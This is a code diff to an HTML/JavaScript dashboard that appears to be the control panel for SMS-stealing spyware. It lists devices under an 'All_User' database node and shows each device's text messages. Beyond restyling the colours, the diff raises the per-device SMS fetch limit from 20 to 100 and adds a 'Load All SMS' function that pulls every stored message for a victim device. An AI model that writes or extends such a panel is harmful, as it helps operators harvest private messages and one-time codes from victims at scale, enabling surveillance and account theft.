@@ -7,21 +7,27 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
 :root{
-  --bg:#0a1810;
-  --surface:#0f2318;
-  --surface2:#142b1e;
-  --surface3:#1a3626;
+  --bg:#0d1117;
+  --surface:#161b22;
+  --surface2:#1c2333;
+  --surface3:#21262d;
   --border:rgba(255,255,255,.08);
-  --border2:rgba(12,156,94,.25);
-  --green:#0c9c5e;
-  --green-dim:#0a7d4a;
-  --green-glow:rgba(12,156,94,.35);
-  --green-soft:rgba(12,156,94,.12);
-  --white:#e8f5ee;
-  --muted:#6b8f7a;
-  --red:#f87171;
-  --red-soft:rgba(248,113,113,.12);
-  --amber:#fbbf24;
+  --border2:rgba(0,212,255,.2);
+  --cyan:#00d4ff;
+  --cyan-dim:#00a8cc;
+  --cyan-glow:rgba(0,212,255,.25);
+  --cyan-soft:rgba(0,212,255,.08);
+  --violet:#7c3aed;
+  --violet-soft:rgba(124,58,237,.12);
+  --green:#10b981;
+  --green-dim:#059669;
+  --green-glow:rgba(16,185,129,.3);
+  --green-soft:rgba(16,185,129,.1);
+  --white:#e6edf3;
+  --muted:#7d8590;
+  --red:#f85149;
+  --red-soft:rgba(248,81,73,.12);
+  --amber:#e3b341;
   --text-bright:#ffffff;
 }
 body{font-family:'Inter','Segoe UI',Arial,sans-serif;background:var(--bg);color:var(--white);min-height:100vh;
@@ -30,7 +36,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 
 /* ===== SETUP / PASSWORD SCREEN ===== */
 #setup-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;
-  background:linear-gradient(160deg,#0a1810 0%,#0c2a1a 50%,#071510 100%);}
+  background:radial-gradient(ellipse at 20% 50%,rgba(124,58,237,.12) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(0,212,255,.08) 0%,transparent 50%),#0d1117;}
 .sc{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.1);border-radius:18px;
   padding:28px 20px;width:100%;max-width:420px;
   box-shadow:0 0 0 1px rgba(12,156,94,.1),0 20px 60px rgba(0,0,0,.4);}
@@ -51,7 +57,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
   padding:10px 13px;border-radius:8px;font-size:13px;margin-top:10px;display:none;line-height:1.5;}
 
 /* ===== TOPBAR ===== */
-.topbar{background:rgba(10,24,16,.95);border-bottom:1px solid var(--border);padding:13px 15px;
+.topbar{background:rgba(13,17,23,.92);border-bottom:1px solid var(--border);padding:13px 15px;
   display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;
   backdrop-filter:blur(12px);}
 .tb-l{display:flex;align-items:center;gap:8px;color:var(--white);font-size:15px;font-weight:700;}
@@ -65,7 +71,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 
 /* ===== APP LAYOUT ===== */
 #app{display:none;flex-direction:column;min-height:100vh;}
-.search-wrap{background:rgba(10,24,16,.95);padding:9px 14px;border-bottom:1px solid var(--border);
+.search-wrap{background:rgba(13,17,23,.92);padding:9px 14px;border-bottom:1px solid var(--border);
   position:sticky;top:55px;z-index:190;backdrop-filter:blur(12px);}
 .sw{position:relative;}
 .sw input{width:100%;background:var(--surface2);border:1.5px solid var(--border);
@@ -91,7 +97,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
   letter-spacing:.5px;cursor:pointer;font-family:inherit;box-shadow:0 4px 16px rgba(12,156,94,.3);}
 
 /* ===== TABS ===== */
-.dash-tabs{display:flex;background:rgba(10,24,16,.95);border-bottom:1px solid var(--border);
+.dash-tabs{display:flex;background:rgba(13,17,23,.92);border-bottom:1px solid var(--border);
   margin-top:10px;position:sticky;top:110px;z-index:180;backdrop-filter:blur(12px);}
 .dtab{flex:1;padding:11px 4px;border:none;background:none;font-size:12px;font-weight:700;
   cursor:pointer;font-family:inherit;border-bottom:2px solid transparent;color:var(--muted);}
@@ -145,7 +151,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 
 /* ===== DETAIL SCREEN ===== */
 #detail-screen{display:none;flex-direction:column;min-height:100vh;}
-.d-top{background:rgba(10,24,16,.95);border-bottom:1px solid var(--border);
+.d-top{background:rgba(13,17,23,.92);border-bottom:1px solid var(--border);
   padding:13px 14px;display:flex;align-items:center;gap:8px;
   position:sticky;top:0;z-index:200;backdrop-filter:blur(12px);}
 .bbtn{background:rgba(255,255,255,.06);color:var(--white);border:1px solid var(--border);
@@ -162,7 +168,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 
 /* ===== DETAIL TABS ===== */
 .tabs{display:flex;border-bottom:1px solid var(--border);
-  background:rgba(10,24,16,.95);position:sticky;top:55px;z-index:100;backdrop-filter:blur(12px);}
+  background:rgba(13,17,23,.92);position:sticky;top:55px;z-index:100;backdrop-filter:blur(12px);}
 .tab-btn{flex:1;padding:11px;border:none;background:none;font-size:12px;font-weight:700;
   cursor:pointer;font-family:inherit;color:var(--muted);}
 .tab-btn.active{color:var(--green);border-bottom:2px solid var(--green);}
@@ -212,7 +218,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
   max-height:90vh;overflow-y:auto;animation:up .2s ease;}
 @keyframes up{from{transform:translateY(60px);opacity:0;}to{transform:translateY(0);opacity:1;}}
 .dlg-hdr{padding:16px 18px;text-align:center;font-size:15px;font-weight:700;
-  color:#ffffff;background:var(--green);}
+  color:#ffffff;background:linear-gradient(135deg,var(--cyan-dim),var(--violet));}
 .dlg-body{padding:16px 16px 28px;}
 .di{width:100%;background:var(--surface2);border:1.5px solid var(--border);
   border-radius:10px;padding:11px 13px;font-size:14px;outline:none;
@@ -243,13 +249,13 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 .sim-rb{width:18px;height:18px;border-radius:50%;border:2px solid var(--border);
   flex-shrink:0;display:flex;align-items:center;justify-content:center;}
 .sim-rb.chk{border-color:var(--green);}
-.sim-rb.chk::after{content:'';width:9px;height:9px;border-radius:50%;background:var(--green);}
+.sim-rb.chk::after{content:'';width:9px;height:9px;border-radius:50%;background:linear-gradient(135deg,var(--cyan-dim),var(--violet));}
 
 /* ===== LOADING / EMPTY ===== */
 .loading{display:flex;align-items:center;justify-content:center;
   padding:50px 14px;gap:12px;color:var(--muted);font-size:14px;}
 .spin{width:22px;height:22px;border:2.5px solid var(--border);
-  border-top-color:var(--green);border-radius:50%;animation:sp .8s linear infinite;}
+  border-top-color:var(--cyan);border-radius:50%;animation:sp .8s linear infinite;}
 @keyframes sp{to{transform:rotate(360deg);}}
 .empty{text-align:center;padding:50px 14px;color:var(--muted);}
 .empty .ei{font-size:40px;margin-bottom:10px;opacity:.4;}
@@ -283,7 +289,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 
 <style>
 /* ===== PLANS PAGE STYLES ===== */
-#plans-screen{display:none;min-height:100vh;background:linear-gradient(160deg,#0a1810 0%,#0c2a1a 50%,#071510 100%);color:#fff;padding:0 0 40px;}
+#plans-screen{display:none;min-height:100vh;background:radial-gradient(ellipse at 20% 50%,rgba(124,58,237,.12) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(0,212,255,.08) 0%,transparent 50%),#0d1117;color:#fff;padding:0 0 40px;}
 .plans-hero{text-align:center;padding:40px 20px 28px;}
 .plans-logo{font-size:48px;margin-bottom:12px;}
 .plans-title{font-size:28px;font-weight:900;letter-spacing:-.5px;color:#fff;margin-bottom:6px;}
@@ -468,7 +474,7 @@ html{overscroll-behavior-y:none;background:var(--bg);}
 </div>
 
 <div id="setup-screen" style="display:none;min-height:100vh;align-items:center;justify-content:center;padding:20px;
-  background:linear-gradient(160deg,#0a1810 0%,#0c2a1a 50%,#071510 100%);">
+  background:radial-gradient(ellipse at 20% 50%,rgba(124,58,237,.12) 0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(0,212,255,.08) 0%,transparent 50%),#0d1117;">
   <div class="sc">
     <div class="logo">
       <div style="font-size:50px">&#128225;</div>
@@ -599,14 +605,19 @@ html{overscroll-behavior-y:none;background:var(--bg);}
     </div>
   </div>
   <div class="panel" id="pnl-sms">
-    <div id="dev-sms-search" style="display:none;padding:8px 14px 4px;position:sticky;top:0;background:#f0f2f5;z-index:10;">
+    <div id="dev-sms-search" style="display:none;padding:8px 14px 4px;position:sticky;top:0;background:rgba(13,17,23,.95);z-index:10;backdrop-filter:blur(12px);">
       <div style="display:flex;gap:8px;align-items:center;">
-        <input id="dev-sms-q" type="text" placeholder="Device SMS search..." onkeydown="if(event.key==='Enter')devSmsSearch()" style="flex:1;padding:9px 12px;border:1.5px solid #e2e8f0;border-radius:10px;font-size:13px;font-family:inherit;outline:none;"/>
-        <button onclick="devSmsSearch()" style="background:#0c9c5e;color:#fff;border:none;border-radius:9px;padding:9px 13px;font-size:14px;cursor:pointer;font-weight:700;">&#128269;</button>
-        <button onclick="devSmsClear()" style="background:#e2e8f0;color:#64748b;border:none;border-radius:9px;padding:9px 11px;font-size:13px;cursor:pointer;">&#10005;</button>
+        <input id="dev-sms-q" type="text" placeholder="Device SMS search..." onkeydown="if(event.key==='Enter')devSmsSearch()" style="flex:1;padding:9px 12px;border:1.5px solid var(--border);border-radius:10px;font-size:13px;font-family:inherit;outline:none;background:var(--surface2);color:var(--white);"/>
+        <button onclick="devSmsSearch()" style="background:linear-gradient(135deg,var(--cyan-dim),var(--violet));color:#fff;border:none;border-radius:9px;padding:9px 13px;font-size:14px;cursor:pointer;font-weight:700;">&#128269;</button>
+        <button onclick="devSmsClear()" style="background:var(--surface2);color:var(--muted);border:1px solid var(--border);border-radius:9px;padding:9px 11px;font-size:13px;cursor:pointer;">&#10005;</button>
       </div>
     </div>
     <div id="dev-sms-list"></div>
+    <div style="padding:4px 0 8px;">
+      <button class="load-all-sms-btn" id="load-all-sms-btn" onclick="loadAllDevSms()">
+        📥 Load All SMS (manual)
+      </button>
+    </div>
   </div>
   <div class="panel hide" id="pnl-data"></div>
   <div class="panel hide" id="pnl-fwd"></div>
@@ -1163,8 +1174,8 @@ function startInfoSSE() {
 var SMS_ES = {}; /* deviceKey -> EventSource */
 function startSmsSSE(devKey, did) {
   if (SMS_ES[devKey]) { try { SMS_ES[devKey].close(); } catch(e){} }
-  /* limitToLast=20 - per-device SMS cap */
-  var url = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=20&stream=true' + (APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '');
+  /* limitToLast=100 - per-device SMS cap */
+  var url = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=100&stream=true' + (APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '');
   try {
     var es = new EventSource(url);
     es.addEventListener('put', function(e) {
@@ -1655,7 +1666,7 @@ function loadSmsTab(key) {
   /* Use did field for Sms node key */
   var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
   var auth = APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '';
-  var fetchUrl = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=20' + auth;
+  var fetchUrl = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22&limitToLast=100' + auth;
   var fullUrl = DB + '/' + NODE + '/All_User/Sms/' + did + '.json' + (APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '');
   (el || listEl).innerHTML = '<div class="loading"><div class="spin"></div>&nbsp;SMS load ho raha hai...</div>';
 
@@ -1758,6 +1769,53 @@ function renderSmsPanel(key, sms, el, debugUrl) {
 }
 
 /* ===== DEVICE SMS SEARCH ===== */
+function loadAllDevSms() {
+  if (!CUR) return;
+  var btn = document.getElementById('load-all-sms-btn');
+  if (btn) { btn.disabled = true; btn.textContent = '⏳ Loading...'; }
+  var dev = DEVS[CUR];
+  if (!dev) return;
+  var did = dev.did || CUR;
+  var auth = APIKEY ? ('?auth=' + encodeURIComponent(APIKEY)) : '';
+  /* Fetch ALL SMS without limit */
+  var url = DB + '/' + NODE + '/All_User/Sms/' + did + '.json?orderBy=%22$key%22' + (auth ? '&' + auth.slice(1) : '');
+  fetch(url)
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      var pnl = document.getElementById('pnl-sms');
+      if (!data || typeof data !== 'object') {
+        if (btn) { btn.disabled = false; btn.textContent = '📥 Load All SMS (manual)'; }
+        showToast('Koi SMS nahi mila');
+        return;
+      }
+      var keys = Object.keys(data).sort();
+      var total = keys.length;
+      /* Remove existing SMS cards and re-render all */
+      var list = document.getElementById('dev-sms-list');
+      list.innerHTML = '';
+      keys.reverse().forEach(function(k) {
+        var s = data[k];
+        if (!s) return;
+        var card = document.createElement('div');
+        card.className = 'sms-card';
+        card.innerHTML =
+          '<div class="sms-addr">' + (s.address || s.sender || '—') + '</div>' +
+          '<div class="sms-body">' + (s.body || s.message || '') + '</div>' +
+          '<div class="sms-time">' + (s.date ? new Date(s.date).toLocaleString('en-IN') : '') + '</div>';
+        list.appendChild(card);
+      });
+      if (btn) {
+        btn.disabled = false;
+        btn.textContent = '✅ ' + total + ' SMS loaded — Scroll up to see all';
+      }
+      showToast('✅ ' + total + ' SMS loaded!');
+    })
+    .catch(function(e) {
+      if (btn) { btn.disabled = false; btn.textContent = '📥 Load All SMS (manual)'; }
+      showToast('❌ Load failed: ' + e.message);
+    });
+}
+
 function devSmsSearch() {
   var q = (document.getElementById('dev-sms-q').value || '').trim().toLowerCase();
   var listEl = document.getElementById('dev-sms-list');
@@ -2430,9 +2488,9 @@ function fetchTodaySms() {
   var all = [], done = 0, total = onDevs.length;
   /* Speed mode: all online devices fetched in parallel, no stagger delay */
   onDevs.forEach(function(dev) {
-    /* limitToLast=20 per device */
+    /* limitToLast=100 per device */
     var auth = APIKEY ? '&auth=' + encodeURIComponent(APIKEY) : '';
-    var url = DB + '/' + NODE + '/All_User/Sms/' + (dev.did||dev.key) + '.json?orderBy=%22$key%22&limitToLast=20' + auth;
+    var url = DB + '/' + NODE + '/All_User/Sms/' + (dev.did||dev.key) + '.json?orderBy=%22$key%22&limitToLast=100' + auth;
     fetch(url, {cache:'no-store'}).then(function(r){ return r.json(); }).then(function(sd) {
       if (sd && typeof sd === 'object') {
         Object.keys(sd).forEach(function(k) {
